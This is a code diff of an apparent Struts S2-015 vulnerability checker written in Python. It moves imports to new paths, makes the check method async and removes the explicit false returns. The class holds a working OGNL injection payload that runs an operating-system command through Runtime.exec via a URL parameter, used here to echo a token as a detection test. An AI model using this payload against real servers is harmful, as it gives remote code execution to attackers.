@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, get_useragent
 
 class S2_015_2_BaseVerify:
     def __init__(self, url):
@@ -25,7 +25,7 @@ class S2_015_2_BaseVerify:
         }
         self.payload = '''%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cmd_str').getInputStream()),#q}'''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -38,15 +38,12 @@ class S2_015_2_BaseVerify:
        
         try:
             check_url = self.url + '?message=' + urlencode(self.payload.replace('cmd_str', 'echo' + ' ' + self.capta), 'total')
-            check_req = request.get(check_url, headers = self.headers)
+            check_req = await request.get(check_url, headers = self.headers)
             if 'foobar' in check_req.headers.keys() and self.capta in check_req.headers['foobar']:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
